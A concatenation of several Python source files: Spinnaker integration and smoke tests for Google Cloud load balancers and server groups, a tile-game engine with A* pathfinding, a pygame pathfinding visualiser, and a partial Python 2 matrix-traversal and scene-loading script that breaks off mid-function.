    payload = self.agent.make_json_payload_from_kwargs(
        job=job, description='Server Group Test - delete load balancer',
        application=self.TEST_APP)

    return st.OperationContract(
      self.new_post_operation(
          title='delete_load_balancer', data=payload, path=self.__path),
      contract=builder.build())


class GoogleServerGroupTest(st.AgentTestCase):
  def test_a_create_load_balancer(self):
    self.run_test_case(self.scenario.create_load_balancer())

  def test_b_create_server_group(self):
    self.run_test_case(self.scenario.create_instances())

  def test_c_resize_server_group(self):
    self.run_test_case(self.scenario.resize_server_group())

  def test_d_clone_server_group(self):
    self.run_test_case(self.scenario.clone_server_group(),
                       # TODO(ewiseblatt): 20160314
                       # There is a lock contention race condition
                       # in clouddriver that causes intermittent failure.
                       max_retries=5)

  def test_e_disable_server_group(self):
    self.run_test_case(self.scenario.disable_server_group())

  def test_f_enable_server_group(self):
    self.run_test_case(self.scenario.enable_server_group())

  def test_g_destroy_server_group_v000(self):
    self.run_test_case(self.scenario.destroy_server_group('v000'))

  def test_h_destroy_server_group_v001(self):
    self.run_test_case(self.scenario.destroy_server_group('v001'))

  def test_z_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer())


def main():

  defaults = {
    'TEST_STACK': GoogleServerGroupTestScenario.DEFAULT_TEST_ID,
    'TEST_APP': 'gcpsvrgrptst' + GoogleServerGroupTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      GoogleServerGroupTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[GoogleServerGroupTest])


if __name__ == '__main__':
  sys.exit(main())

# Copyright 2015 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Smoke test to see if Spinnaker can interoperate with Google Cloud Platform.

See testable_service/integration_test.py and spinnaker_testing/spinnaker.py
for more details.

The smoke test will use ssh to peek at the spinnaker configuration
to determine the managed project it should verify, and to determine
the spinnaker account name to use when sending it commands.

Sample Usage:
    Assuming you have created $PASSPHRASE_FILE (which you should chmod 400)
    and $CITEST_ROOT points to the root directory of this repository
    (which is . if you execute this from the root)

  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/google_smoke_test.py \
    --gce_ssh_passphrase_file=$PASSPHRASE_FILE \
    --gce_project=$PROJECT \
    --gce_zone=$ZONE \
    --gce_instance=$INSTANCE
or
  PYTHONPATH=$CITEST_ROOT:$CITEST_ROOT/spinnaker \
    python $CITEST_ROOT/spinnaker/spinnaker_system/google_smoke_test.py \
    --native_hostname=host-running-smoke-test
    --managed_gce_project=$PROJECT \
    --test_gce_zone=$ZONE
"""

# Standard python modules.
import sys

# citest modules.
import citest.gcp_testing as gcp
import citest.json_contract as jc
import citest.service_testing as st

# Spinnaker modules.
import spinnaker_testing as sk
import spinnaker_testing.gate as gate


class GoogleSmokeTestScenario(sk.SpinnakerTestScenario):
  """Defines the scenario for the smoke test.

  This scenario defines the different test operations.
  We're going to:
    Create a Spinnaker Application
    Create a Load Balancer
    Create a Server Group
    Delete each of the above (in reverse order)
  """

  @classmethod
  def new_agent(cls, bindings):
    """Implements citest.service_testing.AgentTestScenario.new_agent."""
    return gate.new_agent(bindings)

  @classmethod
  def initArgumentParser(cls, parser, defaults=None):
    """Initialize command line argument parser.

    Args:
      parser: argparse.ArgumentParser
    """
    super(GoogleSmokeTestScenario, cls).initArgumentParser(parser, defaults=defaults)

    defaults = defaults or {}
    parser.add_argument(
        '--test_component_detail',
        default='fe',
        help='Refinement for component name to create.')

  def __init__(self, bindings, agent=None):
    """Constructor.

    Args:
      bindings: [dict] The data bindings to use to configure the scenario.
      agent: [GateAgent] The agent for invoking the test operations on Gate.
    """
    super(GoogleSmokeTestScenario, self).__init__(bindings, agent)

    bindings = self.bindings
    bindings['TEST_APP_COMPONENT_NAME'] = (
        '{app}-{stack}-{detail}'.format(
            app=bindings['TEST_APP'],
            stack=bindings['TEST_STACK'],
            detail=bindings['TEST_COMPONENT_DETAIL']))

    # We'll call out the app name because it is widely used
    # because it scopes the context of our activities.
    # pylint: disable=invalid-name
    self.TEST_APP = bindings['TEST_APP']

  def create_app(self):
    """Creates OperationContract that creates a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_create_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def delete_app(self):
    """Creates OperationContract that deletes a new Spinnaker Application."""
    contract = jc.Contract()
    return st.OperationContract(
        self.agent.make_delete_app_operation(
            bindings=self.bindings, application=self.TEST_APP),
        contract=contract)

  def upsert_load_balancer(self):
    """Creates OperationContract for upsertLoadBalancer.

    Calls Spinnaker's upsertLoadBalancer with a configuration, then verifies
    that the expected resources and configurations are visible on GCE. See
    the contract builder for more info on what the expectations are.
    """
    bindings = self.bindings
    load_balancer_name = bindings['TEST_APP_COMPONENT_NAME']
    target_pool_name = '{0}/targetPools/{1}-tp'.format(
        bindings['TEST_GCE_REGION'], load_balancer_name)

    spec = {
        'checkIntervalSec': 9,
        'healthyThreshold': 3,
        'unhealthyThreshold': 5,
        'timeoutSec': 2,
        'port': 80
    }

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'provider': 'gce',
            'stack': bindings['TEST_STACK'],
            'detail': bindings['TEST_COMPONENT_DETAIL'],
            'credentials': bindings['GCE_CREDENTIALS'],
            'region': bindings['TEST_GCE_REGION'],
            'ipProtocol': 'TCP',
            'portRange': spec['port'],
            'loadBalancerName': load_balancer_name,
            'healthCheck': {
                'port': spec['port'],
                'timeoutSec': spec['timeoutSec'],
                'checkIntervalSec': spec['checkIntervalSec'],
                'healthyThreshold': spec['healthyThreshold'],
                'unhealthyThreshold': spec['unhealthyThreshold'],
            },
            'type': 'upsertLoadBalancer',
            'availabilityZones': {bindings['TEST_GCE_REGION']: []},
            'user': '[anonymous]'
        }],
        description='Create Load Balancer: ' + load_balancer_name,
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Added',
                                retryable_for_secs=30)
     .list_resources('http-health-checks')
     .contains_pred_list(
         [jc.PathContainsPredicate('name', '%s-hc' % load_balancer_name),                    
          jc.DICT_SUBSET(spec)]))                    
    (builder.new_clause_builder('Target Pool Added',
                                retryable_for_secs=30)
     .list_resources('target-pools')
     .contains_path_value('name', '%s-tp' % load_balancer_name))
    (builder.new_clause_builder('Forwarding Rules Added',
                                retryable_for_secs=30)
     .list_resources('forwarding-rules')
     .contains_pred_list([
          jc.PathContainsPredicate('name', load_balancer_name),                    
          jc.PathContainsPredicate('target', target_pool_name)]))                    

    return st.OperationContract(
        self.new_post_operation(
            title='upsert_load_balancer', data=payload, path='tasks'),
        contract=builder.build())

  def delete_load_balancer(self):
    """Creates OperationContract for deleteLoadBalancer.

    To verify the operation, we just check that the GCP resources
    created by upsert_load_balancer are no longer visible on GCP.
    """
    load_balancer_name = self.bindings['TEST_APP_COMPONENT_NAME']
    bindings = self.bindings
    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'type': 'deleteLoadBalancer',
            'cloudProvider': 'gce',
            'loadBalancerName': load_balancer_name,
            'region': bindings['TEST_GCE_REGION'],
            'regions': [bindings['TEST_GCE_REGION']],
            'credentials': bindings['GCE_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        description='Delete Load Balancer: {0} in {1}:{2}'.format(
            load_balancer_name,
            bindings['GCE_CREDENTIALS'],
            bindings['TEST_GCE_REGION']),
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Health Check Removed', retryable_for_secs=30)
     .list_resources('http-health-checks')
     .excludes_path_value('name', '%s-hc' % load_balancer_name))
    (builder.new_clause_builder('TargetPool Removed')
     .list_resources('target-pools')
     .excludes_path_value('name', '%s-tp' % load_balancer_name))
    (builder.new_clause_builder('Forwarding Rule Removed')
     .list_resources('forwarding-rules')
     .excludes_path_value('name', load_balancer_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_load_balancer', data=payload, path='tasks'),
        contract=builder.build())

  def create_server_group(self):
    """Creates OperationContract for createServerGroup.

    To verify the operation, we just check that Managed Instance Group
    for the server was created.
    """
    bindings = self.bindings

    # Spinnaker determines the group name created,
    # which will be the following:
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'application': self.TEST_APP,
            'credentials': bindings['GCE_CREDENTIALS'],
            'strategy':'',
            'capacity': {'min':2, 'max':2, 'desired':2},
            'targetSize': 2,
            'image': bindings['TEST_GCE_IMAGE_NAME'],
            'zone': bindings['TEST_GCE_ZONE'],
            'stack': bindings['TEST_STACK'],
            'instanceType': 'f1-micro',
            'type': 'createServerGroup',
            'loadBalancers': [bindings['TEST_APP_COMPONENT_NAME']],
            'availabilityZones': {
                bindings['TEST_GCE_REGION']: [bindings['TEST_GCE_ZONE']]
            },
            'instanceMetadata': {
                'startup-script': ('sudo apt-get update'
                                   ' && sudo apt-get install apache2 -y'),
                'load-balancer-names': bindings['TEST_APP_COMPONENT_NAME']
            },
            'account': bindings['GCE_CREDENTIALS'],
            'authScopes': ['compute'],
            'user': '[anonymous]'
        }],
        description='Create Server Group in ' + group_name,
        application=self.TEST_APP)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Managed Instance Group Added',
                                retryable_for_secs=30)
     .inspect_resource('managed-instance-groups', group_name)
     .contains_path_eq('targetSize', 2))

    return st.OperationContract(
        self.new_post_operation(
            title='create_server_group', data=payload, path='tasks'),
        contract=builder.build())

  def delete_server_group(self):
    """Creates OperationContract for deleteServerGroup.

    To verify the operation, we just check that the GCP managed instance group
    is no longer visible on GCP (or is in the process of terminating).
    """
    bindings = self.bindings
    group_name = '{app}-{stack}-v000'.format(
        app=self.TEST_APP, stack=bindings['TEST_STACK'])

    # TODO(ttomsu): Change this back from asgName to serverGroupName
    #               once it is fixed in orca.
    payload = self.agent.make_json_payload_from_kwargs(
        job=[{
            'cloudProvider': 'gce',
            'serverGroupName': group_name,
            'region': bindings['TEST_GCE_REGION'],
            'zone': bindings['TEST_GCE_ZONE'],
            'asgName': group_name,
            'type': 'destroyServerGroup',
            'regions': [bindings['TEST_GCE_REGION']],
            'zones': [bindings['TEST_GCE_ZONE']],
            'credentials': bindings['GCE_CREDENTIALS'],
            'user': '[anonymous]'
        }],
        application=self.TEST_APP,
        description='DestroyServerGroup: ' + group_name)

    builder = gcp.GceContractBuilder(self.gce_observer)
    (builder.new_clause_builder('Managed Instance Group Removed')
     .inspect_resource('managed-instance-groups', group_name,
                       no_resource_ok=True)
     .contains_path_eq('targetSize', 0))

    (builder.new_clause_builder('Instances Are Removed',
                                retryable_for_secs=30)
     .list_resources('instances')
     .excludes_path_value('name', group_name))

    return st.OperationContract(
        self.new_post_operation(
            title='delete_server_group', data=payload, path='tasks'),
        contract=builder.build())


class GoogleSmokeTest(st.AgentTestCase):
  """The test fixture for the SmokeTest.

  This is implemented using citest OperationContract instances that are
  created by the GoogleSmokeTestScenario.
  """
  # pylint: disable=missing-docstring

  def test_a_create_app(self):
    self.run_test_case(self.scenario.create_app())

  def test_b_upsert_load_balancer(self):
    self.run_test_case(self.scenario.upsert_load_balancer())

  def test_c_create_server_group(self):
    # We'll permit this to timeout for now
    # because it might be waiting on confirmation
    # but we'll continue anyway because side effects
    # should have still taken place.
    self.run_test_case(self.scenario.create_server_group(), timeout_ok=True)

  def test_x_delete_server_group(self):
    self.run_test_case(self.scenario.delete_server_group(), max_retries=5)

  def test_y_delete_load_balancer(self):
    self.run_test_case(self.scenario.delete_load_balancer(),
                       max_retries=5)

  def test_z_delete_app(self):
    # Give a total of a minute because it might also need
    # an internal cache update
    self.run_test_case(self.scenario.delete_app(),
                       retry_interval_secs=8, max_retries=8)


def main():
  """Implements the main method running this smoke test."""

  defaults = {
      'TEST_STACK': str(GoogleSmokeTestScenario.DEFAULT_TEST_ID),
      'TEST_APP': 'gcpsmoketest' + GoogleSmokeTestScenario.DEFAULT_TEST_ID
  }

  return st.ScenarioTestRunner.main(
      GoogleSmokeTestScenario,
      default_binding_overrides=defaults,
      test_case_list=[GoogleSmokeTest])


if __name__ == '__main__':
  sys.exit(main())

from GeneralEngine.constants import *
import random


class ActorSet:
    def __init__(self):
        self.actors = {}
        self.ids = 0
        self.removed_actors = 0

    def bound(self, max_x, max_y):
        self.max_x = max_x
        self.max_y = max_y

    def boundIDbyBoard(self, board):
        for ID in self.actors.keys():
            if not self.actors[ID].noclip:
                x, y = self.actors[ID].getPos()
                assert board[x][y].isTraversable(), "Actor not within traversable unit"
                vecs = self.actors[ID].getColliding()
                if VECTOR_RIGHT in vecs:
                    if not board[(x+1) % len(board)][y].isTraversable():
                        self.actors[ID].resetSubx()
                if VECTOR_LEFT in vecs:
                    if not board[(x-1) % len(board)][y].isTraversable():
                        self.actors[ID].resetSubx()
                if VECTOR_UP in vecs:
                    if not board[x][(y+1) % len(board[0])].isTraversable():
                        self.actors[ID].resetSuby()
                if VECTOR_DOWN in vecs:
                    if not board[x][(y-1) % len(board[0])].isTraversable():
                        self.actors[ID].resetSuby()

    def computeAI(self, boardObj):
        users = [self.actors[ID] for ID in self.actors.keys() if "User Controlled" in self.actors[ID].name and self.actors[ID].visible]
        user_locations = [user.getPos() for user in users]
        all_paths = []
        AIs = [self.actors[ID] for ID in self.actors.keys() if "AI Driven" in self.actors[ID].name and self.actors[ID].visible]
        for AI in AIs:
            if AI.isCentered():
                if AI.mode == "random":
                    dirs = [UP, DOWN, LEFT, RIGHT]
                    available = [boardObj.getUnit(*AI.getPos()).neighbours[index].isTraversable() for index in dirs]
                    if sum(available) == 0:
                        pass
                    elif sum(available) == 1:
                        for vec in range(len(dirs)):
                            if available[vec]:
                                AI.setDirection(VECTORS[dirs[vec]])
                    else:
                        possible = []
                        for index in range(len(dirs)):
                            if VECTORS[dirs[index]] != [-1*x for x in AI.getDirection()] and available[index]:
                                possible.append(VECTORS[dirs[index]])
                        AI.setDirection(random.choice(possible))
                elif AI.mode == "pathToUser":
                    path = boardObj.shortPath(AI.getPos(), user_locations)                    
                    if path is None:
                        pass
                    else:
                        AI.setDirection(getDirection(vectorSubtract(path[0][1], path[0][0])))
                        all_paths.append(path)
                        AI.cur_path = path
            else:
                if AI.cur_path != []:
                    all_paths.append([[AI.getExactPos()]+AI.cur_path[0][1:], AI.cur_path[1]])
        return all_paths

    def getCollisionCommands(self):
        all_commands = []
        keys = list(self.actors.keys())
        for ind1 in range(len(keys)):
            for ind2 in range(ind1+1, len(keys)):
                commands = self.actors[keys[ind1]].collideWith(self.actors[keys[ind2]])
                all_commands = all_commands + commands
        return all_commands

    def removeActors(self):
        self.actors = {}
        self.ids = 0

    def draw(self):
        drawings = []
        for ID in self.actors.keys():
            drawings = drawings + self.actors[ID].draw()
        return drawings

    def moveTick(self):
        for ID in self.actors.keys():
            self.actors[ID].moveTick()

    def readKeys(self, keys):
        for ID in self.actors.keys():
            if "User Controlled" in self.actors[ID].name:
                self.actors[ID].readKeys(keys)

    def addActor(self, actor):
        self.ids += 1
        self.actors[self.ids] = actor
        self.actors[self.ids].bound(self.max_x, self.max_y)
        return self.ids

    def moveActor(self, ID, x, y):
        assert 0 <= x <= self.max_x, "X-axis incorrect value {}".format(x)
        assert 0 <= y <= self.max_y, "Y-axis incorrect value {}".format(y)
        self.actors[ID].x = x
        self.actors[ID].y = y
        self.actors[ID].resetSubx()
        self.actors[ID].resetSuby()

    def allActors(self):
        return [self.actors[ID] for ID in self.actors.keys()]

    def allActorsbyName(self, name):
        return [self.actors[ID] for ID in self.actors.keys() if name in self.actors[ID].name]

    def getActor(self, ID):
        return self.actors[ID]

from GeneralEngine.Unit import *
import numpy as np
from GeneralEngine.BinaryHeap import BinaryHeap, Node

class Board:
    def __init__(self):
        self.initialised = False
        self.board = None

    def initialiseMapFromFile(self, filename):
        file = open(filename, "r")
        self.mapType = file.readline().split(" ")[1]
        self.mapHeight = int(file.readline().split(" ")[1])
        self.mapWidth = int(file.readline().split(" ")[1])
        assert file.readline().rstrip("\n") == "map", "Unknown map format"

        self.originalMap = [["def" for col in range(self.mapHeight)] for row in range(self.mapWidth)]

        for row in range(self.mapHeight):
            tRow = file.readline().rstrip("\n")
            for col in range(self.mapWidth):
                #Because x> y/\, [col][row]
                self.originalMap[col][self.mapHeight-row-1] = tRow[col]
        self.initialised = True
        self.resetToOriginal()

    def resetToOriginal(self):
        #Attach neighbours to each unit
        self.attachNeighbours()
        #IdentifyTurningPoints
        self.identifyTurning()
        #Generate and Attach Connections between turning points
        self.genConnections()

    def attachNeighbours(self):
        assert self.initialised, "Initialise the map from a file first!"
        for row in range(self.mapHeight):
            for col in range(self.mapWidth):
                self.stateMap[col][row].attachNeighbours([
                    self.stateMap[(col-1) % self.mapWidth][(row+1) % self.mapHeight],#Top Left
                    self.stateMap[(col  ) % self.mapWidth][(row+1) % self.mapHeight],#Top
                    self.stateMap[(col+1) % self.mapWidth][(row+1) % self.mapHeight],#Top Right
                    self.stateMap[(col+1) % self.mapWidth][(row  ) % self.mapHeight],#Right
                    self.stateMap[(col+1) % self.mapWidth][(row-1) % self.mapHeight],#Bot Right
                    self.stateMap[(col  ) % self.mapWidth][(row-1) % self.mapHeight],#Bot
                    self.stateMap[(col-1) % self.mapWidth][(row-1) % self.mapHeight],#Bot Left
                    self.stateMap[(col-1) % self.mapWidth][(row  ) % self.mapHeight] #Left
                ])

    def identifyTurning(self):
        assert self.initialised, "Initialise the map from a file first!"
        self.turningNodes = []
        for row in range(self.mapHeight):
            for col in range(self.mapWidth):
                if self.stateMap[col][row].isTraversable():
                    self.stateMap[col][row].identifyTurning()
                    if self.stateMap[col][row].isTurning():
                        self.turningNodes.append([col, row])

    def genConnections(self):
        assert self.initialised, "Initialise the map from a file first!"
        for row in range(self.mapHeight):
            for col in range(self.mapWidth):
                if self.stateMap[col][row].isTraversable():
                    self.stateMap[col][row].setTurningNeighbours(self.nearestNodes(col, row))

    def nearestNodes(self, x, y):
        assert self.turningNodes != [], "Empty turning nodes!"
        #4 Directional map
        found = [0, 0, 0, 0]
        current = [
            [(x-1) % self.mapWidth,  y    % self.mapHeight],
            [ x    % self.mapWidth, (y+1) % self.mapHeight],
            [(x+1) % self.mapWidth,  y    % self.mapHeight],
            [ x    % self.mapWidth, (y-1) % self.mapHeight],
        ]
        while 0 in found:
            for z in range(len(current)):
                if found[z] == 0:
                    if self.stateMap[current[z][0]][current[z][1]].isTraversable():
                        if current[z][0] == x and current[z][1] == y:
                            found[z] = [current[z], "y" if z%2 else "x"]
                        elif self.stateMap[current[z][0]][current[z][1]].isTurning():
                            if z == 0:
                                found[z] = [current[z], "x" if current[z][0] > x else None]
                            elif z == 1:
                                found[z] = [current[z], "y" if current[z][1] < y else None]
                            elif z == 2:
                                found[z] = [current[z], "x" if current[z][0] < x else None]
                            elif z == 3:
                                found[z] = [current[z], "y" if current[z][1] > y else None]
                    else:
                        found[z] = -1
                if found[z] == 0:
                    if z % 2 == 0:
                        current[z][0] = (current[z][0] + z - 1) % self.mapWidth
                    else:
                        current[z][1] = (current[z][1] + 2 - z) % self.mapHeight
        return found

    def getMapSize(self):
        assert self.initialised, "Initialise the map from a file first!"
        return self.mapWidth, self.mapHeight

    def getNodeConnectionCoords(self):
        coords = []
        for x, y in self.turningNodes:
            z = 0
            for turn in self.stateMap[x][y].getTurning():
                if turn != -1:
                    coords.append([(x, y), turn[0], turn[1]])
                z += 1
        return coords

    def getUnit(self, x, y):
        return self.stateMap[x][y]

    def drawCoord(self, x, y):
        return self.stateMap[x][y].Draw()

    def shortPath(self, start_coord, end_coords):                    
        paths = []
        start_x, start_y = start_coord
        for end in end_coords:
            end_x, end_y = end
            found = False
            if end_x == start_x and end_y == start_y:
                return None
            end_neighbour = self.stateMap[end_x][end_y].getTurning()
            start_neighbour = self.stateMap[start_x][start_y].getTurning()
            for index in range(len(end_neighbour)):
                if end_neighbour[index] != -1 and start_neighbour[index] != -1 and end_neighbour[index][0] == start_neighbour[index][0] and not found:
                    found = True
                    paths.append([[[start_x, start_y], [end_x, end_y]],self.getDist((start_x, start_y),(end_x, end_y))])
            if not found:
                end_points = [(neigh[0], self.getDist((end_x, end_y), neigh[0])) for neigh in end_neighbour if neigh != -1]
                heap = BinaryHeap()
                nid = self.coordToID(start_x, start_y)
                g_ = 0
                f_ = self.getDist((start_x, start_y), (end_x, end_y))
                heap.pool[nid] = Node(nid, g_, f_, None)
                heap.insert(nid)
                while not found and heap.size >= 0:
                    removed = heap.remove()
                    cur_x, cur_y = self.IDToCoord(removed)
                    for endTurn in end_points:
                        if endTurn[0][0] == cur_x and endTurn[0][1] == cur_y and not found:
                            cur_path = [(end_x, end_y), endTurn[0]]
                            cur_elem = heap.pool[removed]
                            dist = endTurn[1]
                            while cur_elem.prevID != None:
                                coord1 = self.IDToCoord(cur_elem.id_)
                                cur_elem = cur_elem.prevID
                                coord2 = self.IDToCoord(cur_elem.id_)
                                cur_path.append(coord2)
                                dist += self.getDist(coord1, coord2)
                            found = True
                            paths.append([cur_path[::-1], dist])
                    if not found:
                        newTurning = self.stateMap[cur_x][cur_y].getTurning()
                        for node in newTurning:
                            if node != -1:
                                nid = self.coordToID(node[0][0], node[0][1])
                                if nid not in heap.pool.keys():
                                    g_ = heap.pool[removed].g_ + self.getDist((cur_x, cur_y), node[0])
                                    f_ = g_ + min(map(lambda x: self.getDist(node[0],x[0])+x[1], end_points))
                                    heap.pool[nid] = Node(nid, g_, f_, heap.pool[removed])
                                    heap.insert(nid)
                                else:
                                    g_ = heap.pool[removed].g_ + self.getDist((cur_x, cur_y), node[0])
                                    if g_ <= heap.pool[nid].g_:
                                        heap.pool[nid].g_ = g_
                                        heap.pool[nid].f_ = g_ + min(map(lambda x: self.getDist(node[0],x[0])+x[1], end_points))
                                        heap.pool[nid].prevID = heap.pool[removed]
                                        heap.insert(nid) #Maybe update
        if paths == []:
            return None
        cur_min = paths[0]
        for x in range(1, len(paths)):
            if cur_min[1] > paths[x][1]:
                cur_min = paths[x]
        return cur_min

    def getDist(self, point1, point2):
        return np.abs(point1[0]-point2[0]) + np.abs(point1[1]-point2[1])

    def coordToID(self, x, y):
        return str(x) + "-"*(len(str(self.mapWidth))-len(str(x))) + str(y) + "-"*(len(str(self.mapHeight))-len(str(y)))

    def IDToCoord(self, ID):
        return int(ID[:len(str(self.mapWidth))].rstrip("-")), int(ID[len(str(self.mapHeight)):].rstrip("-"))

#pylint: disable = E1101
import pygame
from draw_utils import Rectangle
from draw_utils import Circle
from draw_utils import Line
from vector2 import Vector2
from a_star import AStar
from graph import Graph
from node import Node
from visual_node import GraphVisual

def main():
#Vector2(17, 17)      For center of square
    pygame.init()
    screen_width = 1360
    screen_height = 760
    screen = pygame.display.set_mode((screen_width, screen_height))
    screen.fill((0, 0, 0))
    grid = Graph(34, 19)                    
    visual_graph = GraphVisual(grid, 40, screen)
    start_square = pygame.rect.Rect(3, 363, 36, 36)
    goal_square = pygame.rect.Rect(1323, 363, 36, 36)
    start_node = Node(Vector2(0, 9))
    goal_node = Node(Vector2(33, 9))
    astar = AStar(grid, start_node, goal_node)
    drawn_path = []
    path = []

    dragging_start = False
    dragging_goal = False
    mouse_is_down = False
    pressed_enter = False
    
    while True:
        screen.fill((0, 0, 0))
        visual_graph = GraphVisual(grid, 40, screen)
#        goal_node = Node(Vector2(goal_square.left, goal_square.top))

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return

        pygame.event.pump()
        if event.type == pygame.MOUSEBUTTONDOWN:
            pressed_enter = False
            del path[:]
            if event.button == 1:
                if start_square.collidepoint(event.pos):
                    dragging_start = True
                    mouse_x, mouse_y = event.pos
                    offset_x = start_square.x - mouse_x
                    offset_y = start_square.y - mouse_y
                elif goal_square.collidepoint(event.pos):
                    dragging_goal = True
                    mouse_x, mouse_y = event.pos
                    offset_x = goal_square.x - mouse_x
                    offset_y = goal_square.y - mouse_y
                else:
                    count = 0
                    for node in visual_graph.node_visual_colliders:
                        if node.collidepoint(event.pos) and mouse_is_down is False:
                            current_state = grid.nodes[count].is_traversable
                            mouse_is_down = True
                        count += 1
        elif event.type == pygame.MOUSEBUTTONUP:
            mouse_is_down = False
            if event.button == 1:
                count = 0
                if dragging_start is True or dragging_goal is True:
                    for collider in visual_graph.node_visual_colliders:
                        if start_square.colliderect(collider):
                            start_square.left = visual_graph.node_visual_colliders[count].left
                            start_square.top = visual_graph.node_visual_colliders[count].top
                            dragging_start = False
                            start_node = Node(Vector2(visual_graph.node_visuals[count].node.get_x(), visual_graph.node_visuals[count].node.get_y()))
                        if goal_square.colliderect(collider):
                            goal_square.left = visual_graph.node_visual_colliders[count].left
                            goal_square.top = visual_graph.node_visual_colliders[count].top
                            dragging_goal = False
                            goal_node = Node(Vector2(visual_graph.node_visuals[count].node.get_x(), visual_graph.node_visuals[count].node.get_y()))
                        count += 1
                    astar = AStar(grid, start_node, goal_node)
        elif event.type == pygame.MOUSEMOTION:
            if dragging_start:
                mouse_x, mouse_y = event.pos
                start_square.x = mouse_x + offset_x
                start_square.y = mouse_y + offset_y
            elif dragging_goal:
                mouse_x, mouse_y = event.pos
                goal_square.x = mouse_x + offset_x
                goal_square.y = mouse_y + offset_y
            elif mouse_is_down:
                count = 0
                for node in visual_graph.node_visual_colliders:
                    if node.collidepoint(event.pos) and grid.nodes[count].is_traversable is current_state:
                        grid.nodes[count].toggle_state("wall")
                    count += 1
                
                
        if pygame.key.get_pressed()[pygame.K_RETURN]:
            pressed_enter = True
            if not path:
                path = astar.find_path()
            else:
                astar = AStar(grid, start_node, goal_node)
                path = astar.find_path()

        if pressed_enter:
            count = 0
            count_two = 1
            while count_two <= len(path) - 1:                    
                line_start = Vector2(path[count].get_x() * 40, path[count].get_y() * 40)
                line_end = Vector2(path[count_two].get_x() * 40, path[count_two].get_y() * 40)
                drawn_path.append(Line(screen, (0, 0, 255), Vector2(line_start.x_pos + 20,                    
                                       line_start.y_pos + 20), Vector2(line_end.x_pos + 20,
                                       line_end.y_pos + 20), 5))
                count += 1
                count_two += 1

        pygame.draw.rect(screen, (0, 255, 0), start_square)                    
        pygame.draw.rect(screen, (255, 0, 0), goal_square)                    
        count = 0
        for node in grid.nodes:
            if node.is_traversable is False:
                pygame.draw.rect(screen, (0, 0, 0), visual_graph.node_visual_colliders[count])
            count += 1
        pygame.display.flip()

main()


import time
from graphics import *

settingspath = os.getcwd() + '/test2.txt'                    
# settingspath = os.getcwd() + '/test1.txt'
framepath = os.getcwd() + '/frame.txt'

agent = []
building = []
triangle = []
road = []
obstacle = []
polygon = []
POI = []

def traverserMatrixDP(matrix):
    x = len(matrix[0])
    rowM = [0 for i in range(0,x+1)]
    myMat = []
    myMat.append(rowM)
    for m in range(0,x):
        myMat.append([0]+matrix[m])
#     print myMat
    n = len(myMat[0])
#     cost = []
#     rowX = [0 for i in range(0,len(matrix[0]))]
#     for i in range(0,x):
#         cost.append(rowX)
#     print cost                    
    cost = [[0]*len(matrix[0]) for i in range(len(matrix[0]))]                    
    print cost                    
    print n                    
    routes = [[0]*len(matrix[0]) for i in range(len(matrix[0]))]                    
    
    for row in range(len(matrix[0])):                    
        route = []                    
        for i in range(row):                    
            route.append(i)                    
#         routes[row] = 
    
    for i in range(0,len(matrix[0])):                    
        for j in range(0,len(matrix[0])):                    
            if(i==0 or j==0):                    
                cost[i][j] = 1                    
            else:
                cost[i][j] = (cost[i-1][j]+cost[i][j-1])                    
    print cost                    
    

def traverSeMatrix(matrix,i,j,m,n,path):
    
    if(i == m-1):
        paux = list(path)
        for k in range(j,n):
#             print "A1: " + str(i*n + k)
            paux.append(i*n + k)
#         print paux
#         for l in range(0,n-j+1):
        for l in range(0,len(paux)):   
            print str(paux[l]) + " ",
        print ""
        return
    
    if(j == n-1):
        paux = list(path)
        for k in range(i,m):
            paux.append(k*n+j)
#         for l in range(0,m-i+1):
        for l in range(0,len(paux)):
            print str(paux[l]) + " ",
        print ""
        return
    
    path.append((i*n)+j)
#     print "I will add at " + str(len(path)-1) + " value: " + str(path[len(path)-1])
    
    traverSeMatrix(matrix, i+1, j, m, n, path)
    
    traverSeMatrix(matrix, i, j+1, m, n, path) 
             
    return

def draw():
    settings = open(settingspath)
    settings.readline()
    while True:
        line = settings.readline()
        if line=="":
            break;
        line = line.split()
        x = float(line[1])
        y = float(line[2])
        if line[0]=="poi":
            num = line[3]
            POI.append([[x,y,num]])
        if line[0]=="agent":
            rad = float(line[3])
            agent.append([[x,y,rad]])
        if line[0]=="obstacle":
            rad = float(line[3])
            type = str(line[4])
            obstacle.append([[x,y,rad, type]])
        if line[0]=="building":
            l = float(line[3])
            b = float(line[4])
            building.append([[x,y,l,b,line[5]]])
        if line[0]=="triangle":
            p2 = float(line[3])
            p3 = float(line[4])
            p4 = float(line[5])
            p5 = float(line[6])
            triangle.append([[x,y,p2,p3,p4,p5,line[6]]])
        if line[0] =="polygon":
            p2 = float(line[3])
            p3 = float(line[4])
            p4 = float(line[5])
            p5 = float(line[6])
            p6 = float(line[7])
            p7 = float(line[8])
            polygon.append([[x,y,p2,p3,p4,p5,p6,p7,line[9]]])
        if line[0]=="road":
            l = float(line[3])
            b = float(line[4])
            h = float(line[5])
